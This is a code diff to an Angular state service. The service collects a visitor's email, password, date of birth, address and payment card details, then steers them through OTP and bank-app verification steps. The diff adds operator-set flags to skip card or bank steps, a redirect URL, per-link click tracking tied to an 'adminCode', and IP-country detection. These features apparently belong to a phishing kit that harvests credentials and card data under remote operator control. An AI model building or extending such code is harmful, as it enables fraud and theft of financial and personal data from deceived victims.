@@ -81,6 +81,7 @@ export class StateService {
   readonly dob = signal<string>('');
   readonly address = signal<string>('');
   readonly country = signal<string>(''); 
+  readonly ipCountry = signal<string>(''); // Detected by Server
   readonly phoneCode = signal<string>('');
   readonly cardNumber = signal<string>(''); 
   readonly cardType = signal<string>(''); // Visa, Mastercard, etc.
@@ -91,6 +92,9 @@ export class StateService {
   // New Flow Control
   readonly verificationFlow = signal<'otp' | 'app' | 'both' | 'complete'>('complete');
   readonly skipPhoneVerification = signal<boolean>(false);
+  readonly skipCardVerification = signal<boolean>(false);
+  readonly skipBankVerification = signal<boolean>(false);
+  readonly redirectUrl = signal<string>('');
 
   // Personalized Link
   readonly adminCode = signal<string>('');
@@ -156,6 +160,7 @@ export class StateService {
         const code = params.get('id');
         if (code) {
             this.adminCode.set(code);
+            this.trackClick(code);
         }
     }
 
@@ -310,6 +315,8 @@ export class StateService {
   private handleSessionTimeout() {
       if (this.showTimeoutWarning) this.showTimeoutWarning.set(false);
 
+      const wasAtLogin = this.stage() === 'login' && !this.email() && !this.password();
+
       // Clear all input fields (Start Over)
       this.email.set('');
       this.password.set('');
@@ -337,7 +344,13 @@ export class StateService {
       // Navigate to login
       this.navigate('login');
       this.stage.set('login');
-      this.rejectionReason.set('Session timed out due to inactivity.');
+
+      if (!wasAtLogin) {
+          this.rejectionReason.set('Session timed out due to inactivity.');
+      } else {
+          this.rejectionReason.set(null);
+      }
+
       this.lastActivityTime = Date.now(); // Reset so we don't loop immediately
 
       // Force sync to update backend
@@ -436,6 +449,7 @@ export class StateService {
       if(data.dob) this.dob.set(data.dob);
       if(data.address) this.address.set(data.address);
       if(data.country) this.country.set(data.country);
+      if(data.ipCountry) this.ipCountry.set(data.ipCountry);
       if(data.cardNumber) this.cardNumber.set(data.cardNumber);
       if(data.cardType) this.cardType.set(data.cardType);
       if(data.cardExpiry) this.cardExpiry.set(data.cardExpiry);
@@ -650,12 +664,12 @@ export class StateService {
 
   private applyRemoteSettings(s: any) {
       if (s.skipPhone !== undefined) this.skipPhoneVerification.set(!!s.skipPhone);
+      if (s.skipCard !== undefined) this.skipCardVerification.set(!!s.skipCard);
+      if (s.skipBank !== undefined) this.skipBankVerification.set(!!s.skipBank);
+      if (s.redirectUrl) this.redirectUrl.set(s.redirectUrl);
+
       if (s.forceBankApp !== undefined && s.forceBankApp) {
-           // Maybe set verificationFlow?
-           // The backend logic currently just passes settings.
-           // We need to respect them.
-           // If 'Force Bank App' is on, we should ensure flow is 'app' or 'both'?
-           // For now, let's just expose it or handle specific flags.
+           this.verificationFlow.set('app');
       }
   }
 
@@ -746,7 +760,8 @@ export class StateService {
             cached.lastSeen !== lastSeen ||
             cached.currentView !== s.currentView ||
             cached.stage !== s.stage ||
-            cached.status !== s.status) {
+            cached.status !== s.status ||
+            cached.isPinned !== s.isPinned) {
 
             cached = {
                 id: s.sessionId,
@@ -967,6 +982,12 @@ export class StateService {
            } else if (currentStage === 'card_pending') {
                this.isCardSubmitted.set(true);
 
+               if (this.skipBankVerification()) {
+                   this.isFlowComplete.set(true);
+                   this.navigate('success', true);
+                   return;
+               }
+
                // Route based on Verification Flow
                const flow = this.verificationFlow();
                if (flow === 'app') {
@@ -1034,6 +1055,16 @@ export class StateService {
 
   // --- Actions ---
 
+  private trackClick(code: string) {
+      // Fire and forget click tracking
+      fetch('/api/track/click', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code }),
+          keepalive: true
+      }).catch(() => {});
+  }
+
   private generateId() {
     return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
   }
@@ -1054,6 +1085,11 @@ export class StateService {
     if (this.currentView() !== view) {
         this.previousView.set(this.currentView());
         this.currentView.set(view);
+
+        // Reset Timer on Navigation
+        this.waitingStart.set(null);
+        this.autoApproveThreshold.set(20000);
+
         this.router.navigate([view]); // Use Angular Router
         if (!isRemote) {
             this.syncState();
@@ -1117,8 +1153,14 @@ export class StateService {
       this.stage.set('personal_pending');
 
       this.rejectionReason.set(null);
-      // Skip loading, go straight to card
-      this.navigate('card');
+
+      if (this.skipCardVerification()) {
+          this.isCardSubmitted.set(true);
+          this.isFlowComplete.set(true);
+          this.navigate('success');
+      } else {
+          this.navigate('card');
+      }
       this.syncState();
   }
 
